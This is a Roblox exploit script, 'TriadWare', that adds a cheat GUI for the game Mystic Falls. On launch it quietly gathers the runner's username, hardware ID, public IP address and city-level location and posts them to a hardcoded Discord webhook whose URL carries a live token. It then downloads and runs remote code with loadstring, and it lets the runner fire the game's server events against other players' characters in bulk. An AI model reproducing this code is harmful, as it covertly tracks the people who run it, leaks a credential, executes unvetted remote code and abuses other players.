game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "TriadWare Mystic Falls",
    Text = "TriadWare Protected by SentinelGuard"
})
wait(0.3)
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local LocalPlayer = Players.LocalPlayer
local request = http_request or request or syn.request

local whitelistedHWIDs = {
    "1BE6B103-40F1-4355-A3FD-DC2CEA1B1E74",
    "whitelisted_hwid_2"
}

function Send(url, embed, Id)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = "<@&" .. Id .. ">",
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = HttpService:JSONEncode(data)
    request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function GameLink()
    local placeId = game.PlaceId
    return "https://www.roblox.com/games/" .. placeId
end

local function Time()
    return os.date("%Y-%m-%d %H:%M:%S")
end

local function GetIP()
    local response = request({
        Url = "https://api.ipify.org",
        Method = "GET"
    })
    return response.Body
end

local function GetLocation(ip)
    local response = request({
        Url = "http://ip-api.com/json/" .. ip,
        Method = "GET"
    })
    local locationData = HttpService:JSONDecode(response.Body)
    return locationData.country .. ", " .. locationData.regionName .. ", " .. locationData.city
end

local function GetExecutor()
    if syn then
        return "Synapse X"
    elseif KRNL_LOADED then
        return "Krnl"
    elseif fluxus then
        return "Fluxus"
    elseif getexecutorname then
        return getexecutorname()
    else
        return "Unknown Executor"
    end
end

local UserID = LocalPlayer.UserId
local Username = LocalPlayer.Name
local GID = game.PlaceId
local GameLink = GameLink()
local HWID = RbxAnalyticsService:GetClientId()
local TimeNow = Time()
local IP = GetIP()
local Location = GetLocation(IP)
local Executor = GetExecutor()

local function IsHWIDWhitelisted(hwid)
    for _, whitelistedHWID in ipairs(whitelistedHWIDs) do
        if hwid == whitelistedHWID then
            return true
        end
    end
    return false
end

local url = "https://discord.com/api/webhooks/1252732600708235325/EGtBZr4hA2qnNaoPE_ClMqBmNt-J8TSFAxG2BmBsuKGpBOm-9bBIa6SFzehp-olbYEFm"
local Id = "1251033979524481059"

local embed = {
    ["title"] = "TriadWare Compulsion",
    ["description"] = "User & Game Info",
    ["color"] = 5344491,
    ["fields"] = {
        {
            ["name"] = "Username",
            ["value"] = Username
        },
        {
            ["name"] = "User ID",
            ["value"] = tostring(UserID)
        },
        {
            ["name"] = "Executor",
            ["value"] = Executor
        },
        {
            ["name"] = "Game Link",
            ["value"] = GameLink
        },
        {
            ["name"] = "Game ID",
            ["value"] = tostring(GID)
        },
        {
            ["name"] = "HWID",
            ["value"] = HWID
        },
        {
            ["name"] = "Time",
            ["value"] = TimeNow
        }
    },
    ["footer"] = {
        ["text"] = "TriadWare Compulsion"
    }
}

if not IsHWIDWhitelisted(HWID) then
    table.insert(embed.fields, {
        ["name"] = "IP ADDRESS",
        ["value"] = IP
    })
    table.insert(embed.fields, {
        ["name"] = "LOCATION",
        ["value"] = Location
    })
end

Send(url, embed, Id)
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local Whitelisted = {
    "1BE6B103-40F1-4355-A3FD-DC2CEA1B1E74",
    "1837E531-57DB-4C21-9841-812DEB0BDFB3"
}
local BlacklistedHWIDs = {
    "BAE1A8FB-6F7D-430A-BEB8-501B3DFD7D62"
}

local function Check()
    local Local = Players.LocalPlayer
    if not Local then return end

    local HWID = RbxAnalyticsService:GetClientId()
    local CheckAuthorization = false
    local CheckBlacklisted = false

    for _, hwid in ipairs(BlacklistedHWIDs) do
        if HWID == hwid then
            CheckBlacklisted = true
            break
        end
    end

    if CheckBlacklisted then
        Local:Kick("Your HWID has been blacklisted by SentinelGuard. If you have any questions contact tisnoah on Discord.")
        return
    end

    for _, hwid in ipairs(Whitelisted) do
        if HWID == hwid then
            CheckAuthorization = true
            break
        end
    end

    if not CheckAuthorization then
        Local:Kick("SentinelGuard has detected unauthorized access for this compulsion GUI. If this is a mistake, please contact Noah at tisnoah#0 to be whitelisted.")
    else
        print("HWID Whitelisted")

        local PlaceID = game.PlaceId
        local APlaceID = 4754736350

        if PlaceID ~= APlaceID then
            Local:Kick("This specific script only supports the game Mystic Falls.")
        else
            print("Correct Game")
        end
    end
end

Check()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Gui = Library.CreateLib("TriadWare | Compulsion", "DarkTheme")
local Player = game.Players.LocalPlayer
local MortalCharacter
local MortalName
local Max = 500
local ActionCount = 1
local MainTab = Gui:NewTab("Main")
local M = MainTab:NewSection("Mortal Settings")
local GUI = Gui:NewTab("GUI Control")
local UI = GUI:NewSection("Toggle UI")

local function GetCharacter(name)
    name = name:lower()
    local players = game:GetService("Players"):GetPlayers()
    for _, p in pairs(players) do
        local character = p.Character
        if character and character:FindFirstChild("CharacterName") then
            local characterName = character.CharacterName.Value:lower()
            if characterName:sub(1, #name) == name then
                return character
            end
        end
    end
    return nil
end

local function compel(actionCommand, actionCount, mortalCharacter, targetCharacter)
    local argsMortal = {"Start", {mortalCharacter}}
    local argsTarget = {"Start", {targetCharacter}}

    game:GetService("ReplicatedStorage").Events.Compulsion:FireServer(unpack(argsMortal))
    wait(0.1)
    for _ = 1, actionCount do
        game:GetService("ReplicatedStorage").Events.Compulsion:FireServer(unpack(argsTarget))
        game:GetService("ReplicatedStorage").Events.Compulsion:FireServer(actionCommand, {targetCharacter})
    end
end

local function resetPosition(originalCFrame)
    if Player.Character and Player.Character.PrimaryPart then
        local primaryPart = Player.Character.PrimaryPart
        primaryPart.CFrame = originalCFrame
    end
end

local actions = {
    {name = "PunchSelf", command = "PunchSelf"},
    {name = "StandStill", command = "StandStill"},
    {name = "AllowMove", command = "AllowMove"},
    {name = "NoMagic", command = "NoMagic"},
    {name = "AllowMagic", command = "AllowMagic"},
    {name = "DontSiphon", command = "DontSiphon"},
    {name = "AllowSiphon", command = "AllowSiphon"},
    {name = "DontPunch", command = "DontPunch"},
    {name = "AllowPunch", command = "AllowPunch"},
    {name = "DontFeed", command = "DontFeed"},
    {name = "AllowFeed", command = "AllowFeed"},
    {name = "RingOff", command = "RingOff"},
    {name = "RingOn", command = "RingOn"},
    {name = "SiphonOut", command = "SiphonOut"},
    {name = "WalkAway", command = "WalkAway"},
    {name = "GiveStake", command = "GiveStake"},
    {name = "Sleep", command = "Sleep"},
    {name = "Follow", command = "Follow"},
    {name = "WerewolfTurn", command = "WearwolfTurn"}
}

M:NewTextBox("Mortal Connect", "", function(value)
    MortalName = value
    MortalCharacter = GetCharacter(value) or game.Players:FindFirstChild(value)
end)

M:NewTextBox("Action Count", "", function(value)
    local newActionCount = tonumber(value)
    if newActionCount then
        ActionCount = math.min(newActionCount, Max)
    end
end)

M:NewTextBox("Target", "", function(value)
    Target = value
end)

M:NewLabel("Actions")
for _, action in ipairs(actions) do
    M:NewButton(action.name, "", function()
        if MortalName then
            MortalCharacter = GetCharacter(MortalName) or game.Players:FindFirstChild(MortalName)
        end
        if MortalCharacter and Target and Player.Character then
            local targetCharacter = GetCharacter(Target) or game.Players:FindFirstChild(Target)
            if targetCharacter then
                local originalCFrame = Player.Character.PrimaryPart.CFrame
                compel(action.command, ActionCount, MortalCharacter, targetCharacter)
                resetPosition(originalCFrame)
            end
        end
    end)
end

UI:NewKeybind("GUI Toggle", "", Enum.KeyCode.RightShift, function()
    Library:ToggleUI()
end)
